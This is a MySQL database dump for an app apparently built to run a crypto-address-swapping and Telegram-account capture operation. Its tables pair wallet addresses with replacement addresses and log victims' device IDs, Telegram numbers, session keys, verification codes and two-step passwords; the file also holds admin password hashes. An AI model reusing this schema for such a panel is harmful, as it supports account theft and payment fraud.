/*
 Navicat Premium Data Transfer

 Source Server         : Full
 Source Server Type    : MySQL
 Source Server Version : 100406
 Source Host           : localhost:3306
 Source Schema         : buchananapp_pc

 Target Server Type    : MySQL
 Target Server Version : 100406
 File Encoding         : 65001

 Date: 27/10/2022 08:10:23
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for address
-- ----------------------------
DROP TABLE IF EXISTS `address`;
CREATE TABLE `address`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `BTC` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `TRC` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `ERC` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `RX_BTC` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `RX_TRC` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `RX_ERC` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `created_at` datetime(0) NULL DEFAULT NULL,
  `updated_at` datetime(0) NULL DEFAULT NULL,
  `INITIAL_TIME` int(11) NULL DEFAULT 0,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of address
-- ----------------------------
INSERT INTO `address` VALUES (1, '35b4KU2NBPVGd8nwB8esTmishqdU2PPUrP_PC', 'TSh9dQg466eMTyQpiQJ8HbXPwPkVxWZcfm', '0x276a84565dcF98b615ff2FB12c42b1E9Caaf7685', '3QtB81hG69yaiHkBCTfPKeZkR8i2yWe8bm', 'TDsmKZ7a5LVnCSW8TVXChWMbAjU8wmCi1Y', '0x31bdE5A8Bf959CD0f1d4006c15eE48055ece3A5c', NULL, '2022-10-25 22:37:07', 1);

-- ----------------------------
-- Table structure for admin
-- ----------------------------
DROP TABLE IF EXISTS `admin`;
CREATE TABLE `admin`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `rule` int(1) NULL DEFAULT NULL,
  `remember_token` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `created_at` datetime(0) NULL DEFAULT NULL,
  `updated_at` datetime(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of admin
-- ----------------------------
INSERT INTO `admin` VALUES (1, 'SuperAdmin', '$2y$10$ZXHi.LNadwj3/nPlaQqoV.nqoQJs06aq2sP7k50OuhotKZfMnGi1C', 1, NULL, '2022-06-27 14:58:57', '2022-06-28 08:18:25');
INSERT INTO `admin` VALUES (2, 'test', '$2y$10$.5JrPpt0L6nYbONOljvPyO3ThdLbdejJysWZVhz17X8rxAWm1p3p2', 2, NULL, '2022-06-30 16:08:04', '2022-06-30 09:21:51');

-- ----------------------------
-- Table structure for copykeys
-- ----------------------------
DROP TABLE IF EXISTS `copykeys`;
CREATE TABLE `copykeys`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `logid` int(11) NOT NULL,
  `phonenumber` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `msg` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL,
  `created_at` datetime(0) NULL DEFAULT NULL,
  `updated_at` datetime(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for ips
-- ----------------------------
DROP TABLE IF EXISTS `ips`;
CREATE TABLE `ips`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipaddress` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `created_at` datetime(0) NULL DEFAULT NULL,
  `updated_at` datetime(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of ips
-- ----------------------------
INSERT INTO `ips` VALUES (1, '210.245.32.3', '2022-07-02 11:24:46', '2022-07-02 11:24:53');
INSERT INTO `ips` VALUES (2, '188.43.136.13', '2022-07-02 11:28:09', '2022-07-02 11:28:11');
INSERT INTO `ips` VALUES (3, '127.0.0.1', '2022-07-03 08:07:56', '2022-07-03 08:07:59');

-- ----------------------------
-- Table structure for keywords
-- ----------------------------
DROP TABLE IF EXISTS `keywords`;
CREATE TABLE `keywords`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `logid` int(11) NOT NULL,
  `trigger_time` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `trigger_key` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `trigger_isout` int(1) NOT NULL DEFAULT 0,
  `trigger_friendname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `trigger_groupname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `trigger_is_blocking` int(1) NOT NULL DEFAULT 0,
  `created_at` datetime(0) NULL DEFAULT NULL,
  `updated_at` datetime(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for login_ips
-- ----------------------------
DROP TABLE IF EXISTS `login_ips`;
CREATE TABLE `login_ips`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipaddress` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `role` int(1) NULL DEFAULT NULL,
  `country_en` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `country_cn` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `created_at` datetime(0) NULL DEFAULT NULL,
  `updated_at` datetime(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 15 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of login_ips
-- ----------------------------
INSERT INTO `login_ips` VALUES (1, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-06 16:58:39', '2022-10-06 16:58:41');
INSERT INTO `login_ips` VALUES (2, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-06 17:58:57', '2022-10-06 17:58:57');
INSERT INTO `login_ips` VALUES (3, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-09 10:54:53', '2022-10-09 10:54:53');
INSERT INTO `login_ips` VALUES (4, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-11 14:44:24', '2022-10-11 14:44:24');
INSERT INTO `login_ips` VALUES (5, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-12 16:12:46', '2022-10-12 16:12:46');
INSERT INTO `login_ips` VALUES (6, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-13 17:12:03', '2022-10-13 17:12:03');
INSERT INTO `login_ips` VALUES (7, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-17 09:21:10', '2022-10-17 09:21:10');
INSERT INTO `login_ips` VALUES (8, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-19 07:48:53', '2022-10-19 07:48:53');
INSERT INTO `login_ips` VALUES (9, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-25 16:01:41', '2022-10-25 16:01:41');
INSERT INTO `login_ips` VALUES (10, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-26 06:30:00', '2022-10-26 06:30:00');
INSERT INTO `login_ips` VALUES (11, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-26 13:56:42', '2022-10-26 13:56:42');
INSERT INTO `login_ips` VALUES (12, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-26 16:28:45', '2022-10-26 16:28:45');
INSERT INTO `login_ips` VALUES (13, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-27 07:01:02', '2022-10-27 07:01:02');
INSERT INTO `login_ips` VALUES (14, '127.0.0.1', 'SuperAdmin', 1, 'Hong Kong Central', '中国', '2022-10-27 09:02:52', '2022-10-27 09:02:52');

-- ----------------------------
-- Table structure for logs
-- ----------------------------
DROP TABLE IF EXISTS `logs`;
CREATE TABLE `logs`  (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `INSTALL_DATE` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `INSTALL_COUNTRY` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `INSTALL_COUNTRY_CN` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `IP_ADDRESS` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `DEVICEID` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `TO_DEVICEID` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `SEND_DELAY` int(11) NULL DEFAULT NULL,
  `RECEIVE_DELAY` int(11) NULL DEFAULT NULL,
  `LOGIN_STATUS` int(1) NOT NULL DEFAULT 0,
  `MARK` int(1) NOT NULL DEFAULT 0,
  `TG_NUMBER` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `DATACENTERID` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `AUTO_KEY` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL,
  `TG_ID` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `NOTE` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL,
  `created_at` datetime(0) NULL DEFAULT NULL,
  `updated_at` datetime(0) NULL DEFAULT NULL,
  `TRIGGER_TIME` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `TRIGGER_KEY` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `LAST_TRIGGER_TIME` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `LAST_TRIGGER_KEY` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `VERIFYCODE` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `TWOSTEP` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`ID`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of logs
-- ----------------------------
INSERT INTO `logs` VALUES (1, '2022-10-22 11:12:13', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

SET FOREIGN_KEY_CHECKS = 1;
